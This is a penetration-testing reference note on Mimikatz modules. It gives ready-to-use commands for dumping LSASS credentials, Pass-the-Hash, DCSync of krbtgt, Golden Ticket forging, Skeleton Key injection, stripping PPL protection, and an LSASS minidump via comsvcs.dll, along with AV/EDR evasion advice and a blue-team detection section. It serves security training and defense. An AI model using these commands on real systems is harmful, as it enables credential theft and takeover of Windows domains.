---
tags: [tools, credentials, memory, ad, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.62 Mimikatz All Modules"
---

# 62 - Mimikatz All Modules

## 1. Executive Summary

Mimikatz, developed by Benjamin Delpy, is arguably the most famous and devastating credential dumping and Active Directory exploitation tool in existence. It fundamentally changes how penetration testers interact with Windows security mechanisms. Mimikatz extracts plaintext passwords, hashes, PINs, and Kerberos tickets directly from memory. It can also generate Golden/Silver tickets, perform Pass-the-Hash, execute DCSync/DCShadow attacks, and bypass advanced modern protections like LSA Protection (PPL) and Credential Guard.

## 2. Core Concepts & Windows Internals

Windows relies heavily on the Local Security Authority Subsystem Service (`LSASS.exe`) to manage security policies and handle user authentication. 
Whenever a user logs in, LSASS stores their credentials in memory. Depending on the OS version and configuration, these might be plaintext (WDigest), NTLM hashes, or Kerberos tickets. 

Mimikatz uses low-level Windows APIs and direct memory manipulation. It opens a handle to the `LSASS.exe` process, decrypts the credential structures using keys derived from the OS (like LsaSrv.dll keys), and extracts the secrets.

## 3. Architecture & Attack Flow Diagram

```text
[Attacker Context]                  [Windows OS Mechanisms]                   [Active Directory]
         |                                     |                                      |
         |--- 1. privilege::debug ------------>| (Acquire SeDebugPrivilege)           |
         |                                     |                                      |
         |--- 2. sekurlsa::logonpasswords ---->| (Open Handle to LSASS.exe)           |
         |                                     |                                      |
         |                                     |<-- 3. Read Process Memory            |
         |                                     |                                      |
         |                                     |-- 4. Locate KIWI / LSA keys          |
         |                                     |                                      |
         |<-- 5. Return Decrypted Hashes/Cleartext                                    |
         |                                                                            |
         |--- 6. lsadump::dcsync /domain:X /user:Y ---------------------------------->|
         |                                                                            |
         |<-- 7. MS-DRSR Replication (Returns Target Hash) <--------------------------|
         |                                                                            |
         |--- 8. kerberos::golden /admin:X /domain:Y /krbtgt:Z ---------------------->|
         |                                                                            |
         |<-- 9. Forges Offline TGT (Golden Ticket)                                   |
```

## 4. Deep Dive: Key Modules and Commands

Mimikatz is structured into multiple modules. Here is an exhaustive breakdown of the most critical ones.

### 4.1. `privilege` Module
Used to manipulate process privileges, an absolute prerequisite for most Mimikatz functionality.
- `privilege::debug`: Requests `SeDebugPrivilege`. Essential for interacting with LSASS.
- `privilege::admin`: Attempts to elevate to standard administrator.

### 4.2. `sekurlsa` Module
The heart of Mimikatz. This module extracts credentials from LSASS.
- `sekurlsa::logonpasswords`: Extracts all available credentials (WDigest, MSV, Kerberos, SSP, TsPkg, DPAPI).
- `sekurlsa::msv`: Dumps NTLM hashes.
- `sekurlsa::wdigest`: Dumps WDigest credentials (plaintext, if enabled/downgraded).
- `sekurlsa::kerberos`: Dumps Kerberos tickets and keys from memory.
- `sekurlsa::dpapi`: Extracts DPAPI master keys from memory.
- `sekurlsa::pth`: Pass-the-Hash. Injects an NTLM hash into a new process.
  ```bash
  sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:1234567890abcdef1234567890abcdef /run:cmd.exe
  ```
- `sekurlsa::tickets`: Dumps Kerberos tickets (TGT/TGS) to disk (`.kirbi` files).

### 4.3. `lsadump` Module
Interacts directly with the LSA/SAM database and Active Directory replication.
- `lsadump::sam`: Dumps the local SAM database (requires `SYSTEM`).
- `lsadump::secrets`: Dumps LSA secrets (machine accounts, cached passwords, services).
- `lsadump::lsa /inject`: Injects into LSASS to dump credentials directly.
- `lsadump::dcsync`: Simulates a Domain Controller and requests replication data from another DC. Allows an attacker to pull *any* AD user's hash without running code on the DC.
  ```bash
  lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
  ```
- `lsadump::dcshadow`: Temporarily registers the attacker's machine as a DC to inject unauthorized changes (like SID History or new SPNs) without leaving standard event logs on the primary DC.

### 4.4. `kerberos` Module
Focuses on manipulating Kerberos tickets.
- `kerberos::list`: Lists tickets in the current session.
- `kerberos::purge`: Purges all tickets from the current session (useful before Pass-the-Ticket).
- `kerberos::ptt`: Pass-the-Ticket. Injects a `.kirbi` file into the current session.
  ```bash
  kerberos::ptt ticket.kirbi
  ```
- `kerberos::golden`: Creates a Golden Ticket (forged TGT) given the domain SID and KRBTGT hash.
  ```bash
  kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /rc4:<krbtgt_hash> /user:Administrator /ptt
  ```
- `kerberos::silver`: Creates a Silver Ticket (forged TGS) for a specific service.

### 4.5. `crypto` and `vault` Modules
- `crypto::certificates /export`: Exports non-exportable certificates (useful for AD CS attacks).
- `vault::cred`: Dumps Windows Vault credentials (saved network passwords, IE/Edge credentials).

### 4.6. `misc` Module
- `misc::skeleton`: Injects a Skeleton Key into LSASS on a Domain Controller. This allows *any* user to authenticate with a master password (default: `mimikatz`) while their normal password still works.

## 5. Advanced Evasion and Protections Bypass

### Bypassing LSA Protection (RunAsPPL)
Modern Windows environments often protect LSASS by running it as a Protected Process Light (PPL). When enabled, even an Administrator with `SeDebugPrivilege` cannot read LSASS memory. Mimikatz bypasses this using its signed kernel driver, `mimidrv.sys`.

1. Drop `mimidrv.sys` to disk.
2. Load the driver: `!+`
3. Remove protection from LSASS: `!processprotect /process:lsass.exe /remove`
4. Proceed with standard dumping: `sekurlsa::logonpasswords`
5. Unload driver: `!-`

### Bypassing Antivirus/EDR
Running `mimikatz.exe` directly on disk will trigger nearly every AV/EDR instantly.
- **In-Memory Execution**: Use tools like Invoke-Mimikatz, Covenant, Cobalt Strike, or custom loaders to reflectively load Mimikatz DLLs into memory.
- **Off-Host Cracking (MiniDump)**: Instead of running Mimikatz on the target, dump the LSASS process memory using standard OS tools, exfiltrate the `.dmp` file, and run Mimikatz locally.
  ```powershell
  # Using comsvcs.dll (Living off the Land)
  rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
  ```
  Then, locally:
  ```text
  mimikatz # sekurlsa::minidump lsass.dmp
  mimikatz # sekurlsa::logonpasswords
  ```

## 6. Detection & Mitigation (Blue Team)

### Mitigations
1. **Enable Credential Guard**: Uses Virtualization-Based Security (VBS) to isolate the LSA secrets in a separate VM container. Mimikatz cannot read memory from the isolated container.
2. **Enable LSA Protection (PPL)**: Set `RunAsPPL=1` in the registry. Prevents non-PPL processes from opening handles to LSASS.
3. **Disable WDigest**: Set `UseLogonCredential` to 0. (Default in Windows 10+).
4. **Restrict Debug Privilege**: Remove `SeDebugPrivilege` from local Administrators via GPO.
5. **Tiered Administration**: Use LAPS for local admin passwords and prevent Domain Admins from logging into standard workstations to prevent credential exposure.

### Detection
- Event ID `4656/4658/4663`: Object Access logs showing handles opened to `lsass.exe` with `0x1010` or `0x1410` access masks.
- Event ID `4673`: Sensitive privilege use (`SeDebugPrivilege`).
- Event ID `4624`: Anomalous Logon Type 9 (often indicative of Pass-the-Hash via `sekurlsa::pth`).
- Event ID `4662`: Directory Service Access (monitoring for DCSync operations by unauthorized accounts).
- YARA rules hunting for Mimikatz strings (`sekurlsa`, `kiwi`, `mimikatz`) in memory.

## 7. Chaining Opportunities

- **Rubeus Integration**: Extract TGTs using Mimikatz (`sekurlsa::tickets /export`), and use [[63 - Rubeus Kerberos Attack Toolkit]] to inject, renew, or perform S4U delegation attacks.
- **AD CS Exploitation**: Use Mimikatz's `crypto::certificates /export` to extract private keys of machine certificates, enabling persistent authentication or ESC1-8 attacks via [[64 - Certify AD CS Attack Tool]].
- **NTLM Relaying / Hashcat**: Dump MSV hashes and either pass them immediately using `sekurlsa::pth`, or crack them offline utilizing [[65 - hashcat Full Mode and Rule Reference]].

## 8. Related Notes

- [[63 - Rubeus Kerberos Attack Toolkit]]
- [[64 - Certify AD CS Attack Tool]]
- [[65 - hashcat Full Mode and Rule Reference]]
- [[60 - Impacket ntlmrelayx Deep Dive]]
- [[12 - Active Directory Persistence Mechanisms]]
